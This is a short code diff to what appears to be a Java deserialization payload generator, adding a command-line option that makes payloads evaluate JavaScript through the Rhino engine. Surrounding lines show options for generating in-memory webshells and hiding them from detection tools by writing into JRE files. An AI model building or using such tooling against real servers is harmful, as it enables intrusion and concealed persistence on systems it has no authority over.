@@ -44,6 +44,7 @@ public class GeneratePayload {
 		options.addOption("n", "gen-mem-shell-name", true, "Memory Shell Class File Name");
 		options.addOption("h", "hide-mem-shell", false, "Hide memory shell from detection tools (type 2 only support SpringControllerMS)");
 		options.addOption("ht", "hide-type", true, "Hide memory shell,type 1:write /jre/lib/charsets.jar 2:write /jre/classes/");
+		options.addOption("rh", "rhino", false, "ScriptEngineManager Using Rhino Engine to eval JS");
 		options.addOption("j", "jboss", false, "Using JBoss ObjectInputStream/ObjectOutputStream");
 		options.addOption("ncs", "no-com-sun", false, "Force Using org.apache.XXX.TemplatesImpl instead of com.sun.org.apache.XXX.TemplatesImpl");
 		options.addOption("mcl", "mozilla-class-loader", false, "Using org.mozilla.javascript.DefiningClassLoader in TransformerUtil");
@@ -120,6 +121,10 @@ public class GeneratePayload {
 
 		if (cmdLine.hasOption("mozilla-class-loader")) {
 			USING_MOZILLA_DEFININGCLASSLOADER = true;
+		}
+
+		if (cmdLine.hasOption("rhino")) {
+			USING_RHINO = true;
 		}
 
 		if (cmdLine.hasOption("gen-mem-shell")) {
